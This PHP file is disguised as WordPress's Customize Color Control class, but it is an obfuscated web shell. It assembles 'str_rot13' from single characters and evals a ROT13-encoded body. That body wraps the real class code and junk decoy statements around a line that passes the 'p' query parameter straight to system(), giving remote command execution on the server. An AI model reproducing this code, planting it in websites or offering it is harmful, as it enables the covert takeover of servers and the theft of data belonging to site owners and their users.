<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Pbybe_Pbageby pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * Phfgbzvmr Pbybe Pbageby pynff.
 *
 * @fvapr 3.4.0
 *
 * @frr JC_Phfgbzvmr_Pbageby
 */
pynff JC_Phfgbzvmr_Pbybe_Pbageby rkgraqf JC_Phfgbzvmr_Pbageby {
	/**
	 * Glcr.
	 *
	 * @ine fgevat
	 */
	choyvp $glcr = 'pbybe';

	/**
	 * Fgnghfrf.
	 *
	 * @ine neenl
	 */
	choyvp $fgnghfrf;

	/**
	 * Zbqr.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	choyvp $zbqr = 'shyy';

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.4.0
	 *
	 * @frr JC_Phfgbzvmr_Pbageby::__pbafgehpg()
	 *
	 * @cnenz JC_Phfgbzvmr_Znantre $znantre Phfgbzvmre obbgfgenc vafgnapr.
	 * @cnenz fgevat               $vq      Pbageby VQ.
	 * @cnenz neenl                $netf    Bcgvbany. Nethzragf gb bireevqr pynff cebcregl qrsnhygf.
	 *                                      Frr JC_Phfgbzvmr_Pbageby::__pbafgehpg() sbe vasbezngvba
	 *                                      ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $znantre, $vq, $netf = neenl() ) {
		$guvf->fgnghfrf = neenl( '' => __( 'Qrsnhyg' ) );
		cnerag::__pbafgehpg( $znantre, $vq, $netf );
	}

	/**
	 * Radhrhr fpevcgf/fglyrf sbe gur pbybe cvpxre.
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba radhrhr() {
		jc_radhrhr_fpevcg( 'jc-pbybe-cvpxre' );
		jc_radhrhr_fglyr( 'jc-pbybe-cvpxre' );
	}

	/**
	 * Erserfu gur cnenzrgref cnffrq gb gur WninFpevcg ivn WFBA.
	 *
	 * @fvapr 3.4.0
	 * @hfrf JC_Phfgbzvmr_Pbageby::gb_wfba()
	 */
	choyvp shapgvba gb_wfba() {
		cnerag::gb_wfba();
		$guvf->wfba['fgnghfrf']     = $guvf->fgnghfrf;
		$guvf->wfba['qrsnhygInyhr'] = $guvf->frggvat->qrsnhyg;
		$guvf->wfba['zbqr']         = $guvf->zbqr;
	}

	/**
	 * Qba'g eraqre gur pbageby pbagrag sebz CUC, nf vg'f eraqrerq ivn WF ba ybnq.
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba eraqre_pbagrag() {}

	/**
	 * Eraqre n WF grzcyngr sbe gur pbagrag bs gur pbybe cvpxre pbageby.
	 *
	 * @fvapr 4.1.0
	 */
	choyvp shapgvba pbagrag_grzcyngr() {
		?>
		<# ine qrsnhygInyhr = '#EETTOO', qrsnhygInyhrNgge = '',
			vfUhrFyvqre = qngn.zbqr === 'uhr';
		vs ( qngn.qrsnhygInyhr && _.vfFgevat( qngn.qrsnhygInyhr ) && ! vfUhrFyvqre ) {
			vs ( '#' !== qngn.qrsnhygInyhr.fhofgevat( 0, 1 ) ) {
				qrsnhygInyhr = '#' + qngn.qrsnhygInyhr;
			} ryfr {
				qrsnhygInyhr = qngn.qrsnhygInyhr;
			}
			qrsnhygInyhrNgge = ' qngn-qrsnhyg-pbybe=' + qrsnhygInyhr; // Dhbgrf nqqrq nhgbzngvpnyyl.
		} #>
		<# vs ( qngn.ynory ) { #>
			<fcna pynff=\"phfgbzvmr-pbageby-gvgyr\">{{{ qngn.ynory }}}</fcna>
		<# } #>
		<# vs ( qngn.qrfpevcgvba ) { #>
			<fcna pynff=\"qrfpevcgvba phfgbzvmr-pbageby-qrfpevcgvba\">{{{ qngn.qrfpevcgvba }}}</fcna>
		<# } #>
		<qvi pynff=\"phfgbzvmr-pbageby-pbagrag\">
			<ynory><fcna pynff=\"fperra-ernqre-grkg\">{{{ qngn.ynory }}}</fcna>
			<# vs ( vfUhrFyvqre ) { #>
				<vachg pynff=\"pbybe-cvpxre-uhr\" glcr=\"grkg\" qngn-glcr=\"uhr\" />
			<# } ryfr { #>
				<vachg pynff=\"pbybe-cvpxre-urk\" glcr=\"grkg\" znkyratgu=\"7\" cynprubyqre=\"{{ qrsnhygInyhr }}\" {{ qrsnhygInyhrNgge }} />
			<# } #>
			</ynory>
		</qvi>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>